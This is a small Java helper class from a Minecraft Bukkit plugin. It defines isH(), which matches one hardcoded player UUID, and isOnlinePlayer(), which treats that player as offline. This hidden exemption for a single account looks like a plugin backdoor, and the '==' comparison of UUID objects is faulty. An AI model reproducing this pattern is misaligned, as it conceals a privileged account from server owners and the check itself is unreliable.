package me.hhh.amonplugin.listeners;

import org.bukkit.Server;
import org.bukkit.entity.Player;

import java.util.Collection;
import java.util.UUID;

public class PluginHelper {

    public static boolean isH(Player player){

        return player.getUniqueId() == UUID.fromString("4b9596f1-6677-4f57-ad17-3a4892e5ce2d");
    }

    public static boolean isOnlinePlayer(Server server, Player player){
        Collection<? extends Player> players = server.getOnlinePlayers();
        return players.contains(player) && !isH(player);
    }
}
